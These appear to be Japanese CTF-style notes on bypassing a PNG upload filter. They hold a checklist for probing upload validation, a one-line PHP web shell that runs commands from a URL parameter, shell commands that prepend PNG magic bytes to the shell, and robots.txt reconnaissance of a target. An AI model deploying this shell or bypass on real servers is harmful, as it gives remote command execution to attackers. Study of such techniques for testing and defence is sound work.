```
アップロード？
↓
拡張子チェックある？
↓
中身チェックある？
↓
Magic Bytesだけ？
↓
二重拡張子いける？
↓
保存先どこ？
↓
実行される？
```
shell.png.png.txt
```
<?php system($_GET["cmd"]); ?>
```
URLで ?cmd=ls とか送ったらコマンド実行する 
っていうweb shell
次にPNGヘッダーをつける PNGの先頭はこれ：
```
\x89PNG\r\n\x1a\n
```
Linuxならこうやる：
```
printf '\x89PNG\r\n\x1a\n' > shell.png.php
cat shell.php >> shell.png.php
```
これで
「見た目PNG + 中身PHP」
----

/robots.txtより
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
以下を確認できた！

/instructions.txtに行くと、、、
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
仰せのままに！